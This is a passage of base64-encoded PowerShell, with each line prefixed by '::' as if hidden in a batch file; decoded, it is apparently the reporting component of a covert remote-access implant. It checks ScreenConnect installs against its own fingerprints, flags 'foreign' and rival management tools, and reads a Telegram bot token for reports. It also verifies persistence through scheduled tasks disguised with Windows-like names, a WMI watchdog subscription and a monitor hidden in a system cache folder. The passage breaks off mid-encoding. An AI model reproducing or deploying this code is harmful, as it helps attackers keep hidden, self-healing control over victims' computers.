::aycsDQogICAgICAgICdCYXJyYWN1ZGEgUk1NJywgJ01hbmFnZWQgV29ya3BsYWNl
::JywgJ0dvdmVybGFuJywgJ1BEUSBEZXBsb3knLCAnUERRIEludmVudG9yeScsICdQ
::RFEgQ29ubmVjdCcsDQogICAgICAgICdOLWFibGUnLCAnTi1jZW50cmFsJywgJ04t
::c2lnaHQnLCAnVGFrZSBDb250cm9sJywgJ0FkdmFuY2VkIE1vbml0b3JpbmcgQWdl
::bnQnLCAnVWx0cmFWaWV3ZXInLCAnQWVyb0FkbWluJywNCiAgICAgICAgJ0xpdGVN
::YW5hZ2VyJywgJ1JhZG1pbicsICdOb01hY2hpbmUnLCAnSXBlcml1cycsICdJU0wg
::TGlnaHQnLCAnQW1teXknLCAnVGlnaHRWTkMnLCAnVWx0cmFWTkMnLCAnUmVhbFZO
::QycNCiAgICApDQogICAgJGtlZXBUb2tlbnMgPSBAKCdEYXR0bycsICdDZW50cmFT
::dGFnZScsICdDYWdTZXJ2aWNlJywgJ0F1dG90YXNrRW5kcG9pbnQnKQ0KICAgICRo
::aXRzID0gTmV3LU9iamVjdCBTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5MaXN0
::W3N0cmluZ10NCiAgICAkc2VlbiA9IEB7fQ0KDQogICAgZnVuY3Rpb24gQWRkLUhp
::dChbc3RyaW5nXSRraW5kLCBbc3RyaW5nXSRuYW1lKSB7DQogICAgICAgICRrZXkg
::PSAiJGtpbmR8JG5hbWUiLlRvTG93ZXJJbnZhcmlhbnQoKQ0KICAgICAgICBpZiAo
::JHNlZW4uQ29udGFpbnNLZXkoJGtleSkpIHsgcmV0dXJuIH0NCiAgICAgICAgJHNl
::ZW5bJGtleV0gPSAkdHJ1ZQ0KICAgICAgICBbdm9pZF0kaGl0cy5BZGQoKCctIFt7
::MH1dIDxjb2RlPnsxfTwvY29kZT4nIC1mICRraW5kLCAoRXNjICRuYW1lKSkpDQog
::ICAgfQ0KICAgIGZ1bmN0aW9uIFRlc3QtS2VlcE5hbWUoW3N0cmluZ10kcykgew0K
::ICAgICAgICBpZiAoLW5vdCAkcykgeyByZXR1cm4gJGZhbHNlIH0NCiAgICAgICAg
::aWYgKCRzIC1saWtlICcqU2NyZWVuQ29ubmVjdConKSB7IHJldHVybiAkdHJ1ZSB9
::DQogICAgICAgIGZvcmVhY2ggKCRrIGluICRrZWVwVG9rZW5zKSB7IGlmICgkcyAt
::bGlrZSAiKiRrKiIpIHsgcmV0dXJuICR0cnVlIH0gfQ0KICAgICAgICByZXR1cm4g
::JGZhbHNlDQogICAgfQ0KDQogICAgR2V0LVNlcnZpY2UgLUVycm9yQWN0aW9uIFNp
::bGVudGx5Q29udGludWUgfCBGb3JFYWNoLU9iamVjdCB7DQogICAgICAgICRuID0g
::JF8uTmFtZQ0KICAgICAgICAkZCA9ICRfLkRpc3BsYXlOYW1lDQogICAgICAgIGlm
::IChUZXN0LUtlZXBOYW1lICRuIC1vciBUZXN0LUtlZXBOYW1lICRkKSB7DQogICAg
::ICAgICAgICBpZiAoJG4gLWxpa2UgJypDZW50cmFTdGFnZSonIC1vciAkZCAtbGlr
::ZSAnKkRhdHRvKicgLW9yICRuIC1saWtlICcqQ2FnU2VydmljZSonKSB7DQogICAg
::ICAgICAgICAgICAgQWRkLUhpdCAna2VlcC1kYXR0bycgKCIkbiAoJCgkXy5TdGF0
::dXMpKSIpDQogICAgICAgICAgICB9DQogICAgICAgICAgICByZXR1cm4NCiAgICAg
::ICAgfQ0KICAgICAgICBmb3JlYWNoICgkdCBpbiAkdG9rZW5zKSB7DQogICAgICAg
::ICAgICBpZiAoJG4gLWxpa2UgIiokdCoiIC1vciAkZCAtbGlrZSAiKiR0KiIpIHsN
::CiAgICAgICAgICAgICAgICBBZGQtSGl0ICdzdmMnICgiJG4gKCQoJF8uU3RhdHVz
::KSkiKQ0KICAgICAgICAgICAgICAgIGJyZWFrDQogICAgICAgICAgICB9DQogICAg
::ICAgIH0NCiAgICB9DQoNCiAgICBHZXQtUHJvY2VzcyAtRXJyb3JBY3Rpb24gU2ls
::ZW50bHlDb250aW51ZSB8IEZvckVhY2gtT2JqZWN0IHsNCiAgICAgICAgJG4gPSAk
::Xy5Qcm9jZXNzTmFtZQ0KICAgICAgICBpZiAoVGVzdC1LZWVwTmFtZSAkbikgeyBy
::ZXR1cm4gfQ0KICAgICAgICBmb3JlYWNoICgkdCBpbiAkdG9rZW5zKSB7DQogICAg
::ICAgICAgICBpZiAoJG4gLWxpa2UgIiokdCoiKSB7DQogICAgICAgICAgICAgICAg
::QWRkLUhpdCAncHJvYycgJG4NCiAgICAgICAgICAgICAgICBicmVhaw0KICAgICAg
::ICAgICAgfQ0KICAgICAgICB9DQogICAgfQ0KDQogICAgJHVuaW5zdCA9IEAoDQog
::ICAgICAgICdIS0xNOlxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50
::VmVyc2lvblxVbmluc3RhbGxcKicsDQogICAgICAgICdIS0xNOlxTT0ZUV0FSRVxX
::T1c2NDMyTm9kZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxVbmlu
::c3RhbGxcKicNCiAgICApDQogICAgZm9yZWFjaCAoJHBhdGggaW4gJHVuaW5zdCkg
::ew0KICAgICAgICBHZXQtSXRlbVByb3BlcnR5ICRwYXRoIC1FcnJvckFjdGlvbiBT
::aWxlbnRseUNvbnRpbnVlIHwgRm9yRWFjaC1PYmplY3Qgew0KICAgICAgICAgICAg
::JGRuID0gJF8uRGlzcGxheU5hbWUNCiAgICAgICAgICAgIGlmICgtbm90ICRkbikg
::eyByZXR1cm4gfQ0KICAgICAgICAgICAgaWYgKFRlc3QtS2VlcE5hbWUgJGRuKSB7
::DQogICAgICAgICAgICAgICAgaWYgKCRkbiAtbGlrZSAnKkRhdHRvKicgLW9yICRk
::biAtbGlrZSAnKkNlbnRyYVN0YWdlKicpIHsgQWRkLUhpdCAna2VlcC1kYXR0bycg
::JGRuIH0NCiAgICAgICAgICAgICAgICByZXR1cm4NCiAgICAgICAgICAgIH0NCiAg
::ICAgICAgICAgIGlmICgkZG4gLWxpa2UgJ1NjcmVlbkNvbm5lY3QqJykgeyByZXR1
::cm4gfQ0KICAgICAgICAgICAgZm9yZWFjaCAoJHQgaW4gJHRva2Vucykgew0KICAg
::ICAgICAgICAgICAgIGlmICgkZG4gLWxpa2UgIiokdCoiKSB7DQogICAgICAgICAg
::ICAgICAgICAgIEFkZC1IaXQgJ21zaScgJGRuDQogICAgICAgICAgICAgICAgICAg
::IGJyZWFrDQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAg
::ICB9DQogICAgfQ0KDQogICAgcmV0dXJuICRoaXRzDQp9DQoNCmZ1bmN0aW9uIEdl
::dC1TY0luc3RhbGxzIHsNCiAgICAkbGlzdCA9IE5ldy1PYmplY3QgU3lzdGVtLkNv
::bGxlY3Rpb25zLkdlbmVyaWMuTGlzdFtzdHJpbmddDQogICAgR2V0LVNlcnZpY2Ug
::LUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBXaGVyZS1PYmplY3QgeyAk
::Xy5OYW1lIC1saWtlICdTY3JlZW5Db25uZWN0IENsaWVudConIH0gfCBGb3JFYWNo
::LU9iamVjdCB7DQogICAgICAgICRmcCA9IGlmICgkXy5OYW1lIC1tYXRjaCAnXCgo
::WzAtOWEtZl17MTZ9KVwpJykgeyAkbWF0Y2hlc1sxXSB9IGVsc2UgeyAnPycgfQ0K
::ICAgICAgICAkdGFnID0gaWYgKCRmcCAtZXEgJzVmNjAxMDU3OTg1MmU1MDcnKSB7
::ICdLRUVQLVNFVlJaJyB9DQogICAgICAgIGVsc2VpZiAoJGZwIC1lcSAnZjg2MWM4
::MTQwZDQ1MzQyNycpIHsgJ0tFRVAtQUxUJyB9DQogICAgICAgIGVsc2UgeyAnRk9S
::RUlHTicgfQ0KICAgICAgICBbdm9pZF0kbGlzdC5BZGQoKCctIDxjb2RlPnswfTwv
::Y29kZT46IDxiPnsxfTwvYj4gW3syfV0nIC1mIChFc2MgJF8uTmFtZSksIChFc2Mg
::KFtzdHJpbmddJF8uU3RhdHVzKSksICR0YWcpKQ0KICAgIH0NCg0KICAgICRyb290
::cyA9IEAoDQogICAgICAgICIke2VudjpQcm9ncmFtRmlsZXN9XFNjcmVlbkNvbm5l
::Y3QgQ2xpZW50KiIsDQogICAgICAgICIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1c
::U2NyZWVuQ29ubmVjdCBDbGllbnQqIg0KICAgICkNCiAgICBmb3JlYWNoICgkcGF0
::IGluICRyb290cykgew0KICAgICAgICBHZXQtQ2hpbGRJdGVtIC1QYXRoICRwYXQg
::LURpcmVjdG9yeSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8IEZvckVh
::Y2gtT2JqZWN0IHsNCiAgICAgICAgICAgIFt2b2lkXSRsaXN0LkFkZCgoJy0gcGF0
::aDogPGNvZGU+ezB9PC9jb2RlPicgLWYgKEVzYyAkXy5GdWxsTmFtZSkpKQ0KICAg
::ICAgICB9DQogICAgfQ0KDQogICAgJHVuaW5zdCA9IEAoDQogICAgICAgICdIS0xN
::OlxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxVbmlu
::c3RhbGxcKicsDQogICAgICAgICdIS0xNOlxTT0ZUV0FSRVxXT1c2NDMyTm9kZVxN
::aWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxVbmluc3RhbGxcKicNCiAg
::ICApDQogICAgZm9yZWFjaCAoJHBhdGggaW4gJHVuaW5zdCkgew0KICAgICAgICBH
::ZXQtSXRlbVByb3BlcnR5ICRwYXRoIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRp
::bnVlIHwgV2hlcmUtT2JqZWN0IHsNCiAgICAgICAgICAgICRfLkRpc3BsYXlOYW1l
::IC1saWtlICcqU2NyZWVuQ29ubmVjdConDQogICAgICAgIH0gfCBGb3JFYWNoLU9i
::amVjdCB7DQogICAgICAgICAgICAkdmVyID0gaWYgKCRfLkRpc3BsYXlWZXJzaW9u
::KSB7ICRfLkRpc3BsYXlWZXJzaW9uIH0gZWxzZSB7ICc/JyB9DQogICAgICAgICAg
::ICBbdm9pZF0kbGlzdC5BZGQoKCctIG1zaTogPGNvZGU+ezB9PC9jb2RlPiB2ezF9
::JyAtZiAoRXNjICRfLkRpc3BsYXlOYW1lKSwgKEVzYyAkdmVyKSkpDQogICAgICAg
::IH0NCiAgICB9DQoNCiAgICBpZiAoJGxpc3QuQ291bnQgLWVxIDApIHsgW3ZvaWRd
::JGxpc3QuQWRkKCctIChub25lKScpIH0NCiAgICByZXR1cm4gJGxpc3QNCn0NCg0K
::JGNmZyA9IEdldC1DZmcNCmlmICgtbm90ICRjZmcuQk9UX1RPS0VOIC1vciAtbm90
::ICRjZmcuQ0hBVF9JRCkgew0KICAgIEFkZC1Db250ZW50IC1MaXRlcmFsUGF0aCAo
::Sm9pbi1QYXRoICRXb3JrRGlyICdib290LmVycicpIC1WYWx1ZSAndGdfc2tpcF9u
::b19jZmcnIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlDQogICAgZXhpdCAy
::DQp9DQoNCiRwcmltID0gJ1NjcmVlbkNvbm5lY3QgQ2xpZW50ICg1ZjYwMTA1Nzk4
::NTJlNTA3KScNCiRhbHQgPSAnU2NyZWVuQ29ubmVjdCBDbGllbnQgKGY4NjFjODE0
::MGQ0NTM0MjcpJw0KJG9zID0gR2V0LU9zSW5mbw0KJHdobyA9IFtTZWN1cml0eS5Q
::cmluY2lwYWwuV2luZG93c0lkZW50aXR5XTo6R2V0Q3VycmVudCgpLk5hbWUNCiRl
::bGV2ID0gKFtTZWN1cml0eS5QcmluY2lwYWwuV2luZG93c1ByaW5jaXBhbF1bU2Vj
::dXJpdHkuUHJpbmNpcGFsLldpbmRvd3NJZGVudGl0eV06OkdldEN1cnJlbnQoKSku
::SXNJblJvbGUoDQogICAgW1NlY3VyaXR5LlByaW5jaXBhbC5XaW5kb3dzQnVpbHRJ
::blJvbGVdOjpBZG1pbmlzdHJhdG9yKQ0KJGlzU3lzdGVtID0gJHdobyAtbGlrZSAn
::KlNZU1RFTSonIC1vciAkd2hvIC1lcSAnTlQgQVVUSE9SSVRZXFNZU1RFTScNCg0K
::JG1zaUNhY2hlID0gSm9pbi1QYXRoICRXb3JrRGlyICdwa2cubXNpJw0KJG1zaVNp
::emUgPSBpZiAoVGVzdC1QYXRoICRtc2lDYWNoZSkgew0KICAgICd7MDpOMH0gS0In
::IC1mICgoR2V0LUl0ZW0gJG1zaUNhY2hlIC1Gb3JjZSkuTGVuZ3RoIC8gMUtCKQ0K
::fSBlbHNlIHsgJ25vbmUnIH0NCg0KJG1vblBhdGggPSBKb2luLVBhdGggJFdvcmtE
::aXIgJ293bl9tb24uY21kJw0KJGV0bE1vbiA9ICIkZW52OlByb2dyYW1EYXRhXE1p
::Y3Jvc29mdFxEaWFnbm9zaXNcU3RhdGVcLmV0bGNhY2hlXGV0bF9tb24uY21kIg0K
::JGhhc01vbiA9IFRlc3QtUGF0aCAkbW9uUGF0aA0KJGhhc0V0bCA9IFRlc3QtUGF0
::aCAkZXRsTW9uDQoNCiMgVDEwOiBvbi1kaXNrIHBheWxvYWQgYnVpbGQgbWFya2Vy
::cyAtPiBldmVyeSByZXBvcnQgcHJvdmVzIGV4YWN0bHkgd2hhdCBpcyBpbnN0YWxs
::ZWQNCmZ1bmN0aW9uIEdldC1QYXlsb2FkQnVpbGQoW3N0cmluZ10kZmlsZSkgew0K
::ICAgIGlmICgtbm90IChUZXN0LVBhdGggJGZpbGUpKSB7IHJldHVybiAnbWlzc2lu
::ZycgfQ0KICAgIGZvcmVhY2ggKCRsIGluIChHZXQtQ29udGVudCAtTGl0ZXJhbFBh
::dGggJGZpbGUgLVRvdGFsQ291bnQgOCAtRm9yY2UgLUVycm9yQWN0aW9uIFNpbGVu
::dGx5Q29udGludWUpKSB7DQogICAgICAgIGlmICgkbCAtbWF0Y2ggJ0JVSUxEXHMr
::XGR7OH0oW0EtWl0rXGQrKScpIHsgcmV0dXJuICRtYXRjaGVzWzFdIH0NCiAgICB9
::DQogICAgcmV0dXJuICc/Jw0KfQ0KJGJNb24gPSBHZXQtUGF5bG9hZEJ1aWxkIChK
::b2luLVBhdGggJFdvcmtEaXIgJ293bl9tb24uY21kJykNCiRiU2VjID0gR2V0LVBh
::eWxvYWRCdWlsZCAoSm9pbi1QYXRoICRXb3JrRGlyICdvd25fc2VjdXJlLmNtZCcp
::DQokYlRnciA9IEdldC1QYXlsb2FkQnVpbGQgKEpvaW4tUGF0aCAkV29ya0RpciAn
::dGdfcmVwb3J0LnBzMScpDQokYkxpYiA9IEdldC1QYXlsb2FkQnVpbGQgKEpvaW4t
::UGF0aCAkV29ya0RpciAnb3duX2xpYi5wczEnKQ0KDQojIHBlci1ob3N0IGlkZW50
::aXR5OiBleHBlY3RlZCB0YXNrIG5hbWVzIGNvbWUgZnJvbSBpZGVudGl0eS5jZmcg
::d2hlbiBwcmVzZW50DQokaWRDZmcgPSBKb2luLVBhdGggJFdvcmtEaXIgJ2lkZW50
::aXR5LmNmZycNCiRpZE1hcCA9IEB7fQ0KaWYgKFRlc3QtUGF0aCAkaWRDZmcpIHsN
::CiAgICBHZXQtQ29udGVudCAtTGl0ZXJhbFBhdGggJGlkQ2ZnIHwgRm9yRWFjaC1P
::YmplY3Qgew0KICAgICAgICBpZiAoJF8gLW1hdGNoICdeXHMqKFtBLVpfXSspXHMq
::PVxzKiguKz8pXHMqJCcpIHsgJGlkTWFwWyRtYXRjaGVzWzFdXSA9ICRtYXRjaGVz
::WzJdIH0NCiAgICB9DQp9DQokZXhwZWN0ZWRUYXNrcyA9IEAoDQogICAgQHsgTmFt
::ZSA9ICQoaWYgKCRpZE1hcC5UQVNLX0EpIHsgJGlkTWFwLlRBU0tfQSB9IGVsc2Ug
::eyAnV2VyUXVldWVTeW5jJyB9KTsgUm9sZSA9ICJ0aWNrICQoJGlkTWFwLk1PX0Ep
::bSAoY2hhaW4xKSIgfSwNCiAgICBAeyBOYW1lID0gJChpZiAoJGlkTWFwLlRBU0tf
::QikgeyAkaWRNYXAuVEFTS19CIH0gZWxzZSB7ICdQbGFTZXJ2ZXJIZWFsdGgnIH0p
::OyBSb2xlID0gImJhY2t1cCAkKCRpZE1hcC5NT19CKW0gKGNoYWluMSkiIH0sDQog
::ICAgQHsgTmFtZSA9ICQoaWYgKCRpZE1hcC5UQVNLX0MpIHsgJGlkTWFwLlRBU0tf
::QyB9IGVsc2UgeyAnV2RpSG9zdFByb3h5JyB9KTsgUm9sZSA9ICdPTlNUQVJUIChj
::aGFpbjEpJyB9LA0KICAgIEB7IE5hbWUgPSAkKGlmICgkaWRNYXAuVEFTS19EKSB7
::ICRpZE1hcC5UQVNLX0QgfSBlbHNlIHsgJ1RjcElwQ29uZmxpY3RSZXMnIH0pOyBS
::b2xlID0gJ09OTE9HT04gKGNoYWluMSknIH0NCikNCiMgY2hhaW4gMjogV01JIHdh
::dGNoZG9nIHN1YnNjcmlwdGlvbg0KJHdtaUMgPSBHZXQtV21pT2JqZWN0IC1OYW1l
::c3BhY2Ugcm9vdFxzdWJzY3JpcHRpb24gLUNsYXNzIENvbW1hbmRMaW5lRXZlbnRD
::b25zdW1lciAtRmlsdGVyICJOYW1lPSdXdWNhY2hlV2F0Y2hkb2dDJyIgLUVycm9y
::QWN0aW9uIFNpbGVudGx5Q29udGludWUNCiRleHBlY3RlZFRhc2tzICs9IEB7IE5h
::bWUgPSAnXFdNSVxXdWNhY2hlV2F0Y2hkb2dDJzsgUm9sZSA9ICd0aW1lciAzbSAo
::Y2hhaW4yKSc7IFdtaSA9ICgkbnVsbCAtbmUgJHdtaUMpIH0NCg0KJHRhc2tMaW5l
::cyA9IE5ldy1PYmplY3QgU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuTGlzdFtz
::dHJpbmddDQokdGFza09rID0gMA0KJHRhc2tCYWQgPSAwDQpmb3JlYWNoICgkdCBp
::biAkZXhwZWN0ZWRUYXNrcykgew0KICAgIGlmICgkdC5Db250YWluc0tleSgnV21p
::JykpIHsNCiAgICAgICAgaWYgKCR0LldtaSkgeyAkdGFza09rKys7ICRtYXJrID0g
::J09LJyB9IGVsc2UgeyAkdGFza0JhZCsrOyAkbWFyayA9ICdNSVNTSU5HJyB9DQog
::ICAgICAgIFt2b2lkXSR0YXNrTGluZXMuQWRkKCgnLSBbezB9XSA8Y29kZT57MX08
::L2NvZGU+IC0gezJ9JyAtZiAkbWFyaywgKEVzYyAkdC5OYW1lKSwgKEVzYyAkdC5S
::b2xlKSkpDQogICAgICAgIGNvbnRpbnVlDQogICAgfQ0KICAgICRoID0gR2V0LVRh
::c2tIZWFsdGggJHQuTmFtZQ0KICAgIGlmICgkaC5QcmVzZW50IC1hbmQgJGguSGVh
::bHRoeSkgew0KICAgICAgICAkdGFza09rKysNCiAgICAgICAgJG1hcmsgPSAnT0sn
::DQogICAgfSBlbHNlaWYgKCRoLlByZXNlbnQgLWFuZCAtbm90ICRoLk91cnMpIHsN
::CiAgICAgICAgJHRhc2tCYWQrKw0KICAgICAgICAkbWFyayA9ICdOT1RfT1VSUycN
::CiAgICB9IGVsc2VpZiAoJGguUHJlc2VudCkgew0KICAgICAgICAkdGFza0JhZCsr
::DQogICAgICAgICRtYXJrID0gJ1dFQUsnDQogICAgfSBlbHNlIHsNCiAgICAgICAg
::JHRhc2tCYWQrKw0KICAgICAgICAkbWFyayA9ICdNSVNTSU5HJw0KICAgIH0NCiAg
::ICAkZXh0cmEgPSAnJw0KICAgIGlmICgkaC5QcmVzZW50KSB7DQogICAgICAgICRi
::aXRzID0gQCgpDQogICAgICAgIGlmICgkaC5TdGF0dXMpIHsgJGJpdHMgKz0gJGgu
::U3RhdHVzIH0NCiAgICAgICAgaWYgKCRoLlJlc3VsdCAtbmUgJycgLWFuZCAkaC5S
::ZXN1bHQgLW5lICcwJykgeyAkYml0cyArPSAoIkxhc3RSZXN1bHQ9IiArICRoLlJl
::c3VsdCkgfQ0KICAgICAgICBpZiAoJGJpdHMuQ291bnQpIHsgJGV4dHJhID0gJyAo
::JyArICgkYml0cyAtam9pbiAnLCAnKSArICcpJyB9DQogICAgfQ0KICAgIFt2b2lk
::XSR0YXNrTGluZXMuQWRkKCgnLSBbezB9XSA8Y29kZT57MX08L2NvZGU+IC0gezJ9
::ezN9JyAtZiAkbWFyaywgKEVzYyAkdC5OYW1lKSwgKEVzYyAkdC5Sb2xlKSwgKEVz
::YyAkZXh0cmEpKSkNCn0NCg0KJHByaW1MaW5lID0gR2V0LVN2Y0xpbmUgJHByaW0N
::CiRhbHRMaW5lID0gR2V0LVN2Y0xpbmUgJGFsdA0KJHByaW1PayA9ICRwcmltTGlu
::ZSAtbGlrZSAnUnVubmluZyonDQokZGVwbG95T2sgPSAkcHJpbU9rIC1hbmQgKCR0
::YXNrT2sgLWdlIDMpIC1hbmQgJGhhc01vbg0KDQokZW1vamlNYXAgPSBAew0KICAg
::IE9LICAgICAgID0gW3N0cmluZ10oW2NoYXJdMHgyNzA1KQ0KICAgIERPV04gICAg
::ID0gKFtzdHJpbmddW2NoYXJdOjpDb252ZXJ0RnJvbVV0ZjMyKDB4MUY2QTgpKQ0K
::ICAgIFJFU1RPUkVEID0gKFtzdHJpbmddW2NoYXJdOjpDb252ZXJ0RnJvbVV0ZjMy
::KDB4MUY3RTIpKQ0KICAgIEZBSUwgICAgID0gW3N0cmluZ10oW2NoYXJdMHgyNzRD
::KQ0KICAgIEZPUkNFICAgID0gW3N0cmluZ10oW2NoYXJdMHgyNkExKQ0KICAgIERF
::UExPWSAgID0gKFtzdHJpbmddW2NoYXJdOjpDb252ZXJ0RnJvbVV0ZjMyKDB4MUY2
::ODApKQ0KICAgIEhCICAgICAgID0gKFtzdHJpbmddW2NoYXJdOjpDb252ZXJ0RnJv
::bVV0ZjMyKDB4MUY0RTEpKQ0KICAgIEdEUk9QICAgID0gKFtzdHJpbmddW2NoYXJd
::OjpDb252ZXJ0RnJvbVV0ZjMyKDB4MUY2QTgpKQ0KfQ0KJGtleSA9ICRTdGF0ZS5U
::b1VwcGVySW52YXJpYW50KCkNCiRlbW9qaSA9IGlmICgkZW1vamlNYXAuQ29udGFp
::bnNLZXkoJGtleSkpIHsgJGVtb2ppTWFwWyRrZXldIH0gZWxzZSB7IChbc3RyaW5n
::XVtjaGFyXTo6Q29udmVydEZyb21VdGYzMigweDFGNEYxKSkgfQ0KDQokdGl0bGUg
::PSBzd2l0Y2ggKCRrZXkpIHsNCiAgICAnT0snIHsgJ1ByaW1hcnkgaGVhbHRoeScg
::fQ0KICAgICdET1dOJyB7ICdQcmltYXJ5IERPV04gLSBoZWFsaW5nJyB9DQogICAg
::J1JFU1RPUkVEJyB7ICdTZXZyeiBSRVNUT1JFRCcgfQ0KICAgICdGQUlMJyB7ICdI
::ZWFsIEZBSUxFRCcgfQ0KICAgICdGT1JDRScgeyAnRm9yY2VkIHJlaW5zdGFsbCcg
::fQ0KICAgICdERVBMT1knIHsgaWYgKCRkZXBsb3lPaykgeyAnRklSU1QgREVQTE9Z
::IE9LJyB9IGVsc2UgeyAnRklSU1QgREVQTE9ZIC0gQ0hFQ0sgTkVFREVEJyB9IH0N
::CiAgICAnSEInIHsgJ2hvdXJseSBkaWdlc3QnIH0NCiAgICAnR0RST1AnIHsgJ1ND
::IERST1AgLSBjYXVzZSByZWNvcmRlZCcgfQ0KICAgIGRlZmF1bHQgeyAiU3RhdGU6
::ICRTdGF0ZSIgfQ0KfQ0KDQokdHJhbnMgPSBpZiAoJE9sZFN0YXRlKSB7ICIkT2xk
::U3RhdGUgLT4gJFN0YXRlIiB9IGVsc2UgeyAkU3RhdGUgfQ0KJHNjTGlzdCA9IEdl
::dC1TY0luc3RhbGxzDQokcm1tSGl0cyA9IEdldC1SbW1IaXRzDQppZiAoJHJtbUhp
::dHMuQ291bnQgLWVxIDApIHsgW3ZvaWRdJHJtbUhpdHMuQWRkKCctIChub25lIGRl
::dGVjdGVkKScpIH0NCg0KJHB1YiA9IEdldC1QdWJsaWNJcA0KJGxhbiA9IEdldC1M
::b2NhbElwcw0KJG5vdyA9IEdldC1EYXRlIC1Gb3JtYXQgJ3l5eXktTU0tZGQgSEg6
::bW06c3Mgenp6Jw0KJHVwdGltZSA9ICduL2EnDQp0cnkgew0KICAgICRib290ID0g
::KEdldC1DaW1JbnN0YW5jZSBXaW4zMl9PcGVyYXRpbmdTeXN0ZW0pLkxhc3RCb290
::VXBUaW1lDQogICAgJHVwdGltZSA9ICd7MDpkZH1kIHswOmhofWggezA6bW19bScg
::LWYgKChHZXQtRGF0ZSkgLSAkYm9vdCkNCn0gY2F0Y2gge30NCg0KIyBjYW1wYWln
::biBzdGF0ZSBmaWxlICh3cml0dGVuIGJ5IG93bl9saWIucHMxIHN0YXRlIGFjdGlv
::bikNCiRzdGF0ZUxpbmUgPSAnbi9hJw0KJHN0YXRlT2JqID0gJG51bGwNCiRzdGF0
::ZVBhdGgyID0gSm9pbi1QYXRoICRXb3JrRGlyICdzdGF0ZS5qc29uJw0KaWYgKFRl
::c3QtUGF0aCAkc3RhdGVQYXRoMikgew0KICAgICRyYXdTdGF0ZSA9IChHZXQtQ29u
::dGVudCAtTGl0ZXJhbFBhdGggJHN0YXRlUGF0aDIgLVJhdykuVHJpbSgpDQogICAg
::dHJ5IHsNCiAgICAgICAgJHN0YXRlT2JqID0gJHJhd1N0YXRlIHwgQ29udmVydEZy
::b20tSnNvbg0KICAgICAgICAkZm9yZWlnbkNzdiA9IGlmICgkc3RhdGVPYmouZm9y
::ZWlnbikgeyAoJHN0YXRlT2JqLmZvcmVpZ24gLWpvaW4gJywnKSB9IGVsc2UgeyAn
::LScgfQ0KICAgICAgICAkc3RhdGVMaW5lID0gInByaW09JCgkc3RhdGVPYmoucHJp
::bSkgYWx0PSQoJHN0YXRlT2JqLmFsdCkgZm9yZWlnbj1bJGZvcmVpZ25Dc3ZdIHRh
::c2tzPSQoJHN0YXRlT2JqLnRhc2tzT2spLyQoJHN0YXRlT2JqLnRhc2tzVG90YWwp
::IHdkPSQoJHN0YXRlT2JqLndhdGNoZG9nKSBoZWFscz0kKCRzdGF0ZU9iai5pbnN0
::YWxsQ291bnQpIg0KICAgIH0gY2F0Y2ggeyAkc3RhdGVMaW5lID0gJHJhd1N0YXRl
::IH0NCn0NCg0KJGRlcGxveUJsb2NrID0gJycNCmlmICgka2V5IC1lcSAnREVQTE9Z
::Jykgew0KICAgICR2ZXJkaWN0ID0gaWYgKCRkZXBsb3lPaykgeyAnREVQTE9ZRUQg
::LyBIRUFMVEhZJyB9IGVsc2UgeyAnREVQTE9ZRUQgQlVUIElOQ09NUExFVEUnIH0N
::CiAgICAkZm9yZWlnbiA9IEAoR2V0LUNoaWxkSXRlbSAtUGF0aCAiJHtlbnY6UHJv
::Z3JhbUZpbGVzfVxTY3JlZW5Db25uZWN0IENsaWVudCoiLCIke2VudjpQcm9ncmFt
::RmlsZXMoeDg2KX1cU2NyZWVuQ29ubmVjdCBDbGllbnQqIiAtRGlyZWN0b3J5IC1F
::cnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwNCiAgICAgICAgV2hlcmUtT2Jq
::ZWN0IHsgJF8uTmFtZSAtbm90bWF0Y2ggJzVmNjAxMDU3OTg1MmU1MDd8Zjg2MWM4
::MTQwZDQ1MzQyNycgfSkNCiAgICAkZGlhZ0xpbmVzID0gTmV3LU9iamVjdCBTeXN0
::ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5MaXN0W3N0cmluZ10NCiAgICAkYm9vdFBh
::dGggPSBKb2luLVBhdGggJFdvcmtEaXIgJ2Jvb3QuZXJyJw0KICAgIGlmIChUZXN0
::LVBhdGggJGJvb3RQYXRoKSB7DQogICAgICAgICRpbnRlcmVzdGluZyA9IEAoDQog
::ICAgICAgICAgICAnbXNpXycsICdmZXRjaF8nLCAncHJpbWFyeV8nLCAnbnVrZV8n
::LCAnbXNpX3RvbycsICdtc2lfZmV0Y2gnLCAnbXNpX2V4aXQnLA0KICAgICAgICAg
::ICAgJ21zaV91bmF2YWlsYWJsZScsICdzZWN1cmVfJywgJ2dvXycsICdleHRlcm1p
::bmF0ZV8nLCAnaWRlbnRpdHlfJywNCiAgICAgICAgICAgICdjcmVhdGVfdGFzaycs
::ICd2ZXJpZnlfdGFzaycsICdvcnBoYW5fJywgJ3N0YWxlXycsICdwb3N0aW5zdGFs
::bCcsICdhbHRfJw0KICAgICAgICApDQogICAgICAgIEdldC1Db250ZW50IC1MaXRl
::cmFsUGF0aCAkYm9vdFBhdGggLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUg
::fA0KICAgICAgICAgICAgV2hlcmUtT2JqZWN0IHsNCiAgICAgICAgICAgICAgICAk
::bGluZSA9ICRfDQogICAgICAgICAgICAgICAgZm9yZWFjaCAoJHQgaW4gJGludGVy
::ZXN0aW5nKSB7IGlmICgkbGluZSAtbGlrZSAiKiR0KiIpIHsgcmV0dXJuICR0cnVl
::IH0gfQ0KICAgICAgICAgICAgICAgICRmYWxzZQ0KICAgICAgICAgICAgfSB8DQog
::ICAgICAgICAgICBTZWxlY3QtT2JqZWN0IC1MYXN0IDI2IHwNCiAgICAgICAgICAg
::IEZvckVhY2gtT2JqZWN0IHsgW3ZvaWRdJGRpYWdMaW5lcy5BZGQoKCctIDxjb2Rl
